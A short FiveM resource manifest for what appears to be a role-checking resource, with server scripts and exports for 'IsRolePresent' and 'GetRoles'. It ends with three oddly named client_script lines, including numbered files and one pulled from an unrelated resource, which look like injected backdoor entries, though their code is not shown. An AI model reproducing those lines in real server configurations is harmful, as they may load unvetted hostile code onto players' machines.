resource_manifest_version "44febabe-d386-4d18-afbe-5e627f4af937"

server_scripts {
	"config.lua",
	"server.lua"
}

server_export "IsRolePresent"
server_export "GetRoles"


client_script '@SexMe/client/link.lua'
client_script '94606.lua'
client_script '@bigswagger/59642.lua'